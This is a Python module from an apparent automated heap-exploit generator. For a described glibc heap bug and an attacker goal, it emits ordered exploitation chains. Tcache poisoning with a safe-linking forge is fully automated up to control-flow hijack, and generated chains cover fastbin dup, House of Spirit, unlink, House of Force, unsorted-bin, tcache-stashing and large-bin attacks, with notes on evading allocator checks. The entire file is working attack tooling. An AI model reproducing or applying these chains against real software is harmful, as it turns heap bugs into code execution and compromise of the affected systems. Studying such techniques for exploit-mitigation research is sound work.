"""Heap-vuln -> primitive chaining (Phase 9 frontier, AAHEG-style, analyst-in-the-loop).

Given a described heap vulnerability (use-after-free / double-free / heap overflow), the
allocator environment (glibc version, tcache), and a goal (arbitrary allocation, arbitrary
write, or control-flow hijack), pick an applicable exploitation **technique** and emit the
full step-by-step chain. The tcache-poisoning technique is fully generated (grooming +
safe-linking fd forge + the write + the trigger); other techniques (fastbin dup, unlink,
House-of-*) are a knowledge base with preconditions + the primitive they yield, surfaced as
analyst-guided outlines.

Deterministic and offline. Emitting the chain is the tool's job; mapping its abstract ops
onto a specific target's alloc/free/use interface is the analyst-in-the-loop step (doc 15).
"""
from __future__ import annotations

from dataclasses import dataclass

from .heap import in_tcache_range, is_fastbin, mangle, request2size, tcache_index


@dataclass
class Vuln:
    vclass: str                       # "uaf" | "double_free" | "heap_overflow"
    size: int = 24                    # the vulnerable allocation's request size
    note: str = ""


@dataclass
class Goal:
    kind: str                         # "arbitrary_alloc" | "arbitrary_write" | "control_flow"
    target: int = 0                   # address to allocate-over / write to / the fn pointer
    value: int = 0                    # value to write / code address to transfer to
    trigger: str = ""                 # how the target is used (e.g. "call the fn pointer")


@dataclass
class Env:
    glibc: tuple = (2, 42)
    tcache: bool = True
    has_leak: bool = True             # arbitrary addresses assume a leak (PIE/heap/libc)
    #: The libc the target actually links, when we have it. Some techniques are decided by a
    #: check that is PRESENT OR ABSENT in the code rather than by a version number, and reading
    #: the bytes beats believing a version table -- see `heap.large_bin_guard`.
    libc_data: bytes = b""


# --------------------------------------------------------------- technique knowledge base
def _ver_ge(a, b):
    return a >= b


def _tcache_applies(v: Vuln, e: Env) -> bool:
    return (e.tcache and v.vclass in ("uaf", "double_free", "heap_overflow")
            and in_tcache_range(request2size(v.size)) and _ver_ge(e.glibc, (2, 26)))


def _tcache_chain(v: Vuln, g: Goal, e: Env) -> dict:
    """Full tcache-poisoning chain to `g` (allocate over target, then write/trigger)."""
    cs = request2size(v.size)
    safe_link = _ver_ge(e.glibc, (2, 32))
    steps = [
        {"op": "alloc", "handle": "A", "size": v.size, "note": "victim size-class"},
        {"op": "alloc", "handle": "B", "size": v.size},
        {"op": "free", "handle": "B"},
        {"op": "free", "handle": "A", "note": "tcache head is now A (LIFO)"},
    ]
    forge = ("mangle(addr(A), TARGET)  # safe-linking: (addr(A)>>12) ^ TARGET"
             if safe_link else "TARGET  # no safe-linking (glibc<2.32)")
    if v.vclass == "double_free" and _ver_ge(e.glibc, (2, 29)):
        steps.append({"op": "note", "detail": "glibc>=2.29 tcache double-free key check: "
                      "prefer the UAF write below over free(A);free(A)."})
    steps.append({"op": "write_fd", "handle": "A", "value": forge,
                  "detail": "the heap vuln overwrites the freed chunk A's forward pointer"})
    steps.append({"op": "alloc", "handle": "_", "size": v.size, "note": "returns A"})
    steps.append({"op": "alloc", "handle": "OUT", "size": v.size,
                  "note": "returns TARGET -- arbitrary allocation"})
    primitive = "arbitrary allocation"
    if g.kind in ("arbitrary_write", "control_flow"):
        steps.append({"op": "write", "handle": "OUT", "value": "VALUE",
                      "detail": "write attacker data into the chunk that overlaps TARGET"})
        primitive = "arbitrary write"
    if g.kind == "control_flow":
        steps.append({"op": "trigger", "detail": g.trigger or
                      "cause the program to use TARGET (call the overwritten pointer)"})
        primitive = "control-flow hijack"
    return {
        "ok": True, "technique": "tcache_poisoning", "auto": True, "primitive": primitive,
        "chunk_size": cs, "tcache_index": tcache_index(cs), "safe_linking": safe_link,
        "steps": steps, "mangle": mangle, "target": g.target, "value": g.value,
        "notes": [
            f"TARGET ({hex(g.target)}) must be 16-byte aligned (tcache alignment check).",
            "TARGET/VALUE are concrete addresses -- supply them from symbols (no-PIE) or a "
            "leak (PIE/heap/libc).",
        ],
    }


# --------------------------------------------------------------- generated advisory chains
# Each generator emits the concrete op sequence for a classic heap technique (not just a
# prose outline). Unlike tcache poisoning -- fully auto and push-button -- these still need an
# analyst-supplied fake chunk, a leak, or a specific glibc, so they are *generated-but-
# advisory*: honest chains, analyst-in-the-loop. `confirmed` marks the ones whose mechanics we
# live-verify against the host's real glibc in the test suite (see tests/test_aaheg.py).

def _fill_tcache(size):
    return {"op": "groom", "detail": f"alloc 7 then free 7 chunks of size {size} to fill "
            "that size-class's tcache bin, so the next frees reach the fastbin (glibc>=2.26)"}


def _fastbins(e: Env) -> dict:
    """Whether this environment still HAS fastbins. Read from the libc's bytes when we have them
    (the `fasttop` check and the `mxfast` knob exist only where fastbins do), otherwise unknown --
    and never defaulted to yes, because on current glibc the answer is no."""
    from . import heap as _heap
    if e.libc_data:
        return _heap.fastbins_present(e.libc_data)
    return {"present": None, "glibc": ".".join(str(x) for x in e.glibc),
            "reason": "no libc bytes supplied, so whether this glibc still has fastbins is "
                      "UNKNOWN -- pass Env(libc_data=...) to decide it. Do not assume yes: "
                      "fastbins are gone from 2.43"}


def _check_verdict(e: Env, message: bytes, what: str, blocks: str) -> dict:
    """A yes/no on one allocator check, by counting the jumps that reach its error string."""
    from . import heap as _heap
    if not e.libc_data:
        return {"present": None,
                "reason": f"no libc bytes supplied, so whether {what} is UNKNOWN -- pass "
                          "Env(libc_data=...) to decide it"}
    sites = _heap.guard_sites(e.libc_data, message)
    if sites is None and e.libc_data.find(message) < 0:
        return {"present": False, "reason": f"{what}: the check is not in this libc at all"}
    if sites is None:
        return {"present": None,
                "reason": f"{what}: the check's string is here but its reference could not be "
                          "located, so the sites cannot be counted"}
    return {"present": True, "sites": sites,
            "reason": f"{what}: present, {sites} site(s) -- {blocks}"}


def _fastbin_dup(v: Vuln, g: Goal, e: Env):
    cs = request2size(v.size)
    fb = _fastbins(e)
    if fb["present"] is False:
        # Not blocked by a check -- there is no fastbin to dup into. Say which evidence says so.
        return ([{"op": "note", "detail": fb["reason"]},
                 {"op": "note", "detail":
                  "a free past the tcache lands in a bin, which unlinks with the full check set, "
                  "so the cheap singly-linked push this technique is built on does not exist. "
                  "Use tcache_poisoning (same size class, already driven) or tcache_stashing."}],
                ["BLOCKED: " + fb["reason"],
                 "confirm with heap.post_tcache_destination(): it reports \"bin\" here and "
                 "\"fastbin\" on a libc that still has them -- same probe binary, two libcs"])
    safe = _ver_ge(e.glibc, (2, 32))
    fd = ("mangle(addr(A), FAKE)  # fastbins are safe-linked in glibc>=2.32"
          if safe else "FAKE  # no safe-linking (glibc<2.32)")
    steps = [
        _fill_tcache(v.size),
        {"op": "alloc", "handle": "A", "size": v.size},
        {"op": "alloc", "handle": "B", "size": v.size},
        {"op": "free", "handle": "A", "note": "fastbin head = A"},
        {"op": "free", "handle": "B", "note": "head = B, so free(A) next passes the fasttop "
         "double-free check (head != A)"},
        {"op": "free", "handle": "A", "note": "A is now double-listed: A -> B -> A"},
        {"op": "alloc", "handle": "_", "size": v.size, "note": "returns A"},
        {"op": "write_fd", "handle": "A", "value": fd,
         "detail": f"forge A.fd -> FAKE (a fake chunk whose size field == {hex(cs)}: the "
         "fastbin size check compares it to the bin index)"},
        {"op": "alloc", "handle": "__", "size": v.size, "note": "returns B"},
        {"op": "alloc", "handle": "___", "size": v.size, "note": "returns A (2nd time)"},
        {"op": "alloc", "handle": "OUT", "size": v.size, "note": "returns FAKE"},
    ]
    precond = ["fastbin-size chunk (chunk 0x20..0x80)",
               f"a fake chunk near TARGET with size field == {hex(cs)} at TARGET-0x8",
               "fill the tcache first so frees reach the fastbin -- and fill it to its MEASURED "
               "capacity, not to 7"]
    if fb["present"] is None:
        precond.append("UNVERIFIED: " + fb["reason"])
    return steps, precond


def _fastbin_dup_primitive(e: Env) -> str:
    fb = _fastbins(e)
    if fb["present"] is False:
        return "nothing: this libc has no fastbins"
    if fb["present"] is None:
        return "arbitrary allocation (unverified: no libc supplied, and 2.43 has no fastbins)"
    return "arbitrary allocation"


def _house_of_spirit(v: Vuln, g: Goal, e: Env):
    cs = request2size(v.size)
    fb = _fastbins(e)
    # Where the forged chunk actually goes decides which checks it has to survive. With fastbins
    # gone the classic "forge a fastbin-size chunk" framing is wrong: a tcache-range chunk lands
    # in the TCACHE, which has its own checks, and anything bigger lands in a bin with the full
    # set -- so this technique did not die with the fastbins, it moved.
    fast = is_fastbin(cs) and fb["present"] is not False
    dest = "fastbin" if fast else ("tcache" if in_tcache_range(cs) else "a bin")
    steps = [
        {"op": "forge", "detail": f"in controlled memory build a fake chunk: size field = "
         f"{hex(cs | 1)} ({hex(cs)} | PREV_INUSE), 16-byte aligned user pointer"},
        {"op": "forge", "detail": f"set the *next* chunk's size (at +{hex(cs)}) to a sane "
         "value, e.g. 0x21, to pass the next-size sanity check", "optional": not fast},
        {"op": "free", "handle": "FAKE",
         "detail": f"free(&fake.userdata) -- the fake chunk enters {dest}"},
        {"op": "alloc", "handle": "OUT", "size": v.size,
         "note": "returns &fake.userdata -- an allocation over attacker-controlled memory"},
    ]
    precond = [f"a writable region you can forge a {hex(cs)} chunk header in",
               "the fake user pointer must be 16-byte aligned",
               "yields a chunk overlapping controlled memory (then write through it)",
               f"on this libc the forged chunk lands in {dest}"]
    if dest == "tcache":
        precond += ["the tcache's own checks apply: 16-byte alignment "
                    "(\"free(): unaligned chunk detected in tcache 2\"), a size field whose "
                    "tcache index matches the bin, and a `key` field that must not already equal "
                    "tcache_key (\"free(): double free detected in tcache 2\") -- zero the "
                    "forged chunk's +0x8 word",
                    "no next-size check on this path, which makes it EASIER than the fastbin "
                    "form, not harder"]
    elif dest == "a bin":
        precond.append("a bin free runs the full check set: \"free(): invalid size\", "
                       "\"free(): invalid next size (normal)\" and the consolidation checks, so "
                       "the next chunk's size field has to be forged sanely too")
    if fb["present"] is False:
        precond.append("note: " + fb["reason"])
    return steps, precond


def _house_of_force(v: Vuln, g: Goal, e: Env):
    steps = [
        {"op": "overflow", "detail": "overflow the top chunk's size field to "
         "0xffffffffffffffff (SIZE_MAX)"},
        {"op": "alloc", "handle": "_", "size": "(TARGET - &top_user - 2*SIZE_SZ) as unsigned",
         "note": "the huge request moves the top chunk to just below TARGET"},
        {"op": "alloc", "handle": "OUT", "size": v.size, "note": "returns TARGET"},
    ]
    return steps, ["glibc<2.29 (a top-size check removed this in 2.29)",
                   "a heap-base leak to compute the malloc delta"]


def _unlink(v: Vuln, g: Goal, e: Env):
    steps = [
        {"op": "note", "detail": "P is a program pointer (at &P) that points to a chunk you "
         "control -- the overflow source."},
        {"op": "forge", "detail": "inside P's chunk build a fake free chunk: fd = &P - 0x18, "
         "bk = &P - 0x10 (so fd->bk == P and bk->fd == P, passing the unlink consistency "
         "check)"},
        {"op": "overflow", "detail": "overflow the *next* chunk: set prev_size = the fake "
         "chunk's size and clear its PREV_INUSE bit"},
        {"op": "free", "handle": "NEXT", "detail": "free(next) back-coalesces and unlink()s "
         "the fake chunk, writing (&P - 0x18) into P"},
        {"op": "write", "handle": "P", "detail": "P now points 0x18 before itself; writing "
         "through P overwrites P (and neighbours) with attacker data"},
    ]
    chk = _check_verdict(e, b"corrupted double-linked list\x00",
                         "the unlink fd/bk consistency check",
                         "the forged fd/bk MUST satisfy fd->bk == P and bk->fd == P, which is "
                         "what makes this a write of &P-0x18 into P rather than an arbitrary one")
    steps.append({"op": "note", "detail": chk["reason"]})
    precond = ["heap overflow into an adjacent chunk",
               "a known pointer &P to a controlled chunk",
               "the write is &P-0x18 into P -- NOT an arbitrary value at an arbitrary address"]
    precond.append(("constrained by: " if chk["present"] else "unconstrained here: ")
                   + chk["reason"])
    precond.append("also gated by \"corrupted size vs. prev_size\": the forged prev_size must "
                   "match the fake chunk's size field exactly")
    return steps, precond


def _unsorted_bin_attack(v: Vuln, g: Goal, e: Env):
    steps = [
        {"op": "alloc", "handle": "V", "size": v.size, "note": "small (non-fast) chunk"},
        {"op": "alloc", "handle": "GUARD", "size": v.size,
         "note": "prevents V from consolidating with the top chunk when freed"},
        {"op": "free", "handle": "V", "note": "V enters the unsorted bin"},
        {"op": "write_bk", "handle": "V", "value": "TARGET - 0x10",
         "detail": "corrupt V.bk (UAF/overflow) so the unsorted-bin unlink writes to TARGET"},
        {"op": "alloc", "handle": "_", "size": v.size,
         "note": "the malloc scans the unsorted bin and writes &main_arena.bins[..] to TARGET"},
    ]
    chk = _check_verdict(e, b"malloc(): unsorted double linked list corrupted\x00",
                         "the unsorted-bin bk-integrity check",
                         "the scan verifies `bck->fd == victim`, so TARGET must already hold "
                         "&victim and the write is not free")
    steps.append({"op": "note", "detail": chk["reason"]})
    # The classic worked example for "an unchosen large value at a chosen address" is
    # `global_max_fast`, which turns every later free into a fastbin free. That example is void on
    # a libc with no fastbins, so name it only where it exists.
    fb = _fastbins(e)
    example = ("e.g. global_max_fast, which turns later frees into fastbin frees"
               if fb["present"] else
               "and the usual worked example, global_max_fast, does not exist on a libc without "
               "fastbins -- so the deliverable has to be some counter in the TARGET program")
    precond = ["non-fastbin (small) size",
               "writes an unchosen libc (main_arena) VALUE, not an arbitrary one -- the "
               f"deliverable is a counter/size overwrite, not data ({example})",
               ("BLOCKED as a free write: " if chk["present"] else "unguarded here: ")
               + chk["reason"]]
    if chk["present"]:
        precond.append("so pair it with a primitive that can seed TARGET first, or prefer "
                       "tcache_stashing, whose stashing unlink is NOT checked")
    return steps, precond


def _tcache_stash(v: Vuln, g: Goal, e: Env):
    """Tcache stashing unlink: arbitrary allocation out of the ONE unlink glibc still does not
    check. Everything stated here was measured on the libc in hand, not taken from the recipe --
    three details of which are wrong on current glibc."""
    from . import heap as _heap
    guard = (_heap.smallbin_stash_guard(e.libc_data) if e.libc_data else
             {"sites": None, "unchecked": None,
              "reason": "no libc bytes supplied, so whether the stashing unlink is still "
                        "unchecked is UNKNOWN -- pass Env(libc_data=...) to decide it"})
    cap = _heap.tcache_capacity() or _heap.TCACHE_COUNT
    bypass = _heap.tcache_bypass_allocators()
    bypassers = [k for k in ("calloc", "memalign", "realloc") if bypass.get(k)]
    steps = [
        {"op": "note", "detail": f"tcache capacity for this size class, measured: {cap} "
                                 f"(the recipes all say 7)"},
        {"op": "alloc", "handle": f"V0..V{cap + 1}", "size": v.size,
         "note": f"{cap + 2} chunks, each followed by a guard so no free consolidates"},
        {"op": "free", "handle": f"V0..V{cap + 1}",
         "note": f"the first {cap} fill the tcache; the last two spill to the unsorted bin"},
        {"op": "alloc", "handle": "_", "size": max(v.size * 8, 0x1000),
         "note": "a bigger request: its unsorted-bin scan SORTS the two spilled chunks into the "
                 "smallbin, and a view of either leaks the bin head (libc) and the other's "
                 "address (heap) -- both leaks for free"},
        {"op": "write_bk", "handle": "the chunk whose bk IS the bin head", "value": "TARGET - 0x10",
         "detail": "that chunk is what the STASHING loop unlinks; last(bin) goes through the "
                   "guarded unlink instead, so leave its links alone"},
        {"op": "write", "handle": "TARGET + 0x8", "value": "the smallbin head",
         "detail": "the fake chunk's own bk, read as the next last(bin). Point it at the bin head "
                   "or the loop spins forever: glibc's `if (tc_victim != 0)` skips the body "
                   "without advancing, so a NULL there hangs rather than crashes"},
    ]
    if bypassers:
        steps.append({"op": "note", "detail":
                      f"trigger: {' or '.join(bypassers)} -- measured to bypass the tcache on "
                      "this libc, so the smallbin path can be reached with the tcache FULL "
                      "(fill it to capacity-1 and the loop stops after one stash, which keeps "
                      "the libc write at TARGET)"})
    if not bypass.get("calloc", True):
        steps.append({"op": "note", "detail":
                      "calloc does NOT bypass the tcache on this libc -- it takes the tcache head "
                      "like malloc. Every published version of this attack triggers it with "
                      "calloc, and that no longer works."})
    steps.append({"op": "alloc", "handle": "__", "size": v.size,
                  "note": "with that tcache bin EMPTY this reaches the smallbin path: the guarded "
                          "unlink hands out last(bin), then the stashing loop writes &bin to "
                          "TARGET and stashes the fake chunk"})
    steps.append({"op": "alloc", "handle": "ARB", "size": v.size,
                  "note": "and this one RETURNS TARGET"})
    precond = [f"a smallbin size: chunk < 0x400 (requested {v.size:#x})",
               "TARGET 16-aligned, and TARGET+0x8 writable before the trigger (it is the fake "
               "chunk's bk)",
               "a writable byte at TARGET-0x10+chunk_size+0x8 (set_inuse_bit_at_offset)",
               "NO safe-link mangling anywhere: smallbin fd/bk are not protected, so unlike "
               "tcache poisoning this needs no heap leak to mangle a pointer with"]
    if guard["unchecked"] is True:
        precond.append("live here: " + guard["reason"])
        precond.append("with a plain malloc trigger the libc write at TARGET is TRANSIENT -- "
                       "tcache_put writes the fake chunk's `next` at fake+0x10, which is TARGET, "
                       "over the &bin the unlink just put there. The deliverable is the "
                       "ARBITRARY ALLOCATION.")
    elif guard["unchecked"] is False:
        precond.append("BLOCKED: " + guard["reason"])
    else:
        precond.append("UNKNOWN: " + guard["reason"])
    steps.append({"op": "note", "detail": guard["reason"]})
    return steps, precond


def _tcache_stash_primitive(e: Env) -> str:
    from . import heap as _heap
    if not e.libc_data:
        return "arbitrary allocation (unverified: no libc supplied)"
    g = _heap.smallbin_stash_guard(e.libc_data)
    if g["unchecked"] is False:
        return "nothing: the stashing unlink is checked on this libc"
    return "arbitrary allocation at a chosen address, with no safe-link mangling"


def _large_bin_guard(e: Env) -> dict:
    """Whether this environment's large-bin insertion still writes unchecked. Decided from the
    libc's own bytes when we have them, and otherwise from the version, with that said out loud."""
    from . import heap as _heap
    if e.libc_data:
        g = dict(_heap.large_bin_guard(e.libc_data))
        g["measured"] = g.get("sites") is not None
        return g
    return {"sites": None, "arbitrary": None, "measured": False,
            "glibc": ".".join(str(x) for x in e.glibc),
            "reason": "no libc bytes supplied, so whether this glibc guards the short insertion "
                      "branch is UNKNOWN -- pass Env(libc_data=...) to decide it"}


def _large_bin_primitive(e: Env) -> str:
    g = _large_bin_guard(e)
    if g["arbitrary"] is True:
        return "write a heap address to a chosen location"
    if g["arbitrary"] is False:
        return ("replace a stored pointer to one of our chunks with a pointer to another "
                "(NOT an arbitrary write on this libc)")
    return "write a heap address to a chosen location (unverified: no libc supplied)"


def _large_bin_attack(v: Vuln, g: Goal, e: Env):
    guard = _large_bin_guard(e)
    steps = [
        {"op": "alloc", "handle": "L1", "size": v.size, "note": "large-bin size"},
        {"op": "alloc", "handle": "G1", "size": v.size, "note": "guard (blocks consolidation)"},
        {"op": "alloc", "handle": "L2", "size": max(v.size - 0x20, 0x400),
         "note": "slightly smaller so it sorts ahead of L1 by nextsize"},
        {"op": "alloc", "handle": "G2", "size": v.size, "note": "guard"},
        {"op": "free", "handle": "L1"},
        {"op": "alloc", "handle": "_", "size": v.size + 0x1000, "note": "sorts L1 into its "
         "large bin"},
        {"op": "write_nextsize", "handle": "L1", "value": "TARGET - 0x20",
         "detail": "corrupt L1.bk_nextsize (and L1.bk = TARGET-0x10) via the vuln"},
        {"op": "free", "handle": "L2"},
        {"op": "alloc", "handle": "__", "size": v.size + 0x1000,
         "note": "inserting L2 into the large bin writes &L2 to L1.bk_nextsize+0x20 == TARGET"},
    ]
    precond = ["large-bin size (chunk >= 0x400), and above the tcache ceiling (chunk > 0x410) so "
               "the free does not go to the tcache instead",
               "L1 and L2 must land in the SAME large bin: largebin_index() groups sizes, so "
               "heap.largebin_index(chunk_L1) == heap.largebin_index(chunk_L2)",
               "writes &L2 (a heap address) to TARGET"]
    if guard["arbitrary"] is False:
        steps.append({"op": "note", "detail": guard["reason"]})
        steps.append({"op": "note", "detail":
                      "so TARGET must ALREADY hold &L1 for the write to land. `_IO_list_all` "
                      "holds a libc pointer, so it is not reachable this way on this libc -- use "
                      "heap.build_house_of_cat with a primitive that can write it directly, or a "
                      "target that stores a pointer to one of our own chunks."})
        precond.append("BLOCKED as an arbitrary write: " + guard["reason"])
        precond.append("still usable as a pointer swap where TARGET already holds &L1")
    elif guard["arbitrary"] is True:
        steps.append({"op": "note", "detail": guard["reason"]})
        steps.append({"op": "note", "detail":
                      "TARGET = `_IO_list_all` turns this into a full chain: the FILE it then "
                      "points at is entirely ours, so heap.build_house_of_cat supplies the blob "
                      "and exit()'s stream flush runs it."})
        precond.append("the short insertion branch is unguarded here, so TARGET is free")
    else:
        steps.append({"op": "note", "detail": guard["reason"]})
        precond.append("guard status UNKNOWN: " + guard["reason"])
    return steps, precond


# advisory techniques: preconditions, the primitive yielded, and a full generated chain.
_ADVISORY = [
    {"technique": "fastbin_dup", "primitive": "arbitrary allocation",
     "primitive_for": _fastbin_dup_primitive,
     # Still LISTED where the size fits even when the libc has no fastbins: an omitted technique
     # reads as "not considered", and the useful output is the reason it cannot work.
     "applies": lambda v, e: v.vclass in ("double_free", "uaf")
     and 0x20 <= request2size(v.size) <= 0x80,
     "build": _fastbin_dup, "confirmed": True,
     "summary": "double-free a fastbin chunk (bypass the fasttop check by cycling a 2nd "
                "chunk), then forge the dup'd chunk's fd to a fake chunk near the target."},
    {"technique": "house_of_spirit", "primitive": "arbitrary allocation",
     "applies": lambda v, e: v.vclass in ("uaf", "heap_overflow"),
     "build": _house_of_spirit, "confirmed": True,
     "summary": "free() a forged chunk header over attacker-controlled memory, then malloc "
                "returns it."},
    {"technique": "unlink", "primitive": "write a pointer to &(P) (near-arbitrary write)",
     "applies": lambda v, e: v.vclass == "heap_overflow",
     "build": _unlink,
     "summary": "overflow size/prev_size + fd/bk of a free chunk so unlink() (on coalesce) "
                "writes &P-0x18 over a pointer P."},
    {"technique": "house_of_force", "primitive": "arbitrary allocation",
     "applies": lambda v, e: v.vclass == "heap_overflow" and not _ver_ge(e.glibc, (2, 29)),
     "build": _house_of_force,
     "summary": "overflow the top chunk's size to SIZE_MAX, then malloc a computed size to "
                "move the top to an arbitrary address (removed by the 2.29 top-size check)."},
    {"technique": "unsorted_bin_attack",
     "primitive": "write a libc (main_arena) address to a chosen location",
     "applies": lambda v, e: v.vclass in ("uaf", "heap_overflow")
     and not is_fastbin(request2size(v.size)),
     "build": _unsorted_bin_attack,
     "summary": "corrupt a free unsorted-bin chunk's bk to (TARGET-0x10); the next malloc "
                "scanning it writes &main_arena.bins[..] to TARGET."},
    {"technique": "tcache_stashing",
     "primitive": "arbitrary allocation at a chosen address",
     "primitive_for": _tcache_stash_primitive,
     # A smallbin size, and something that can write a freed chunk's bk.
     "applies": lambda v, e: (v.vclass in ("uaf", "heap_overflow", "double_free")
                              and request2size(v.size) < 0x400
                              and not is_fastbin(request2size(v.size))),
     "build": _tcache_stash, "confirmed": True,
     "summary": "fill the tcache, spill two same-size chunks into the smallbin, corrupt the "
                "to-be-stashed one's bk; the stashing loop's UNCHECKED unlink then puts a fake "
                "chunk at TARGET-0x10 into the tcache, so the next allocation returns TARGET."},
    {"technique": "large_bin_attack",
     "primitive": "write a heap/controlled address to a chosen location",
     # Decided per-libc rather than stated once: the guard that makes or breaks this technique is
     # present or absent in the code, and `Env.libc_data` lets us read which.
     "primitive_for": _large_bin_primitive,
     "applies": lambda v, e: v.vclass in ("uaf", "heap_overflow")
     and request2size(v.size) >= 0x400,
     "build": _large_bin_attack,
     "summary": "two large chunks in one large bin; corrupt the first's bk_nextsize so "
                "inserting the second writes its address to TARGET (bk_nextsize+0x20)."},
]


TECHNIQUES = [
    {"technique": "tcache_poisoning", "primitive": "arbitrary allocation",
     "applies": _tcache_applies, "build": _tcache_chain, "auto": True},
]


def _advisory_for(vuln: Vuln, env: Env) -> list:
    """Generated advisory chains applicable to `vuln`/`env` (each carries its full op-chain,
    preconditions, and whether its mechanics are live-confirmed on the host glibc)."""
    out = []
    for t in _ADVISORY:
        if not t["applies"](vuln, env):
            continue
        steps, precond = t["build"](vuln, Goal("arbitrary_alloc"), env)
        prim = t["primitive_for"](env) if t.get("primitive_for") else t["primitive"]
        out.append({"technique": t["technique"], "primitive": prim,
                    "outline": t["summary"], "generated": True, "auto": False,
                    "confirmed_on_real_glibc": t.get("confirmed", False),
                    "steps": steps, "preconditions": precond})
    return out


def plan_exploit(vuln: Vuln, goal: Goal, env: Env | None = None) -> dict:
    """Select a technique for `vuln` that achieves `goal` under `env`, and emit its chain.
    Returns the auto-generated chain when one applies, plus any advisory alternatives -- each
    of which now carries its own generated op-chain (not just an outline)."""
    env = env or Env()
    advisory = _advisory_for(vuln, env)
    for t in TECHNIQUES:
        if t["applies"](vuln, env):
            chain = t["build"](vuln, goal, env)
            chain["advisory_alternatives"] = advisory
            chain["vuln"] = {"class": vuln.vclass, "size": vuln.size}
            chain["goal"] = {"kind": goal.kind, "target": hex(goal.target),
                             "value": hex(goal.value)}
            return chain
    if advisory:
        return {"ok": False, "reason": "no auto-generated (push-button) technique applies; "
                "generated analyst-guided chains below", "advisory_alternatives": advisory}
    return {"ok": False, "reason": f"no known heap technique for {vuln.vclass} under "
            f"glibc {env.glibc}"}
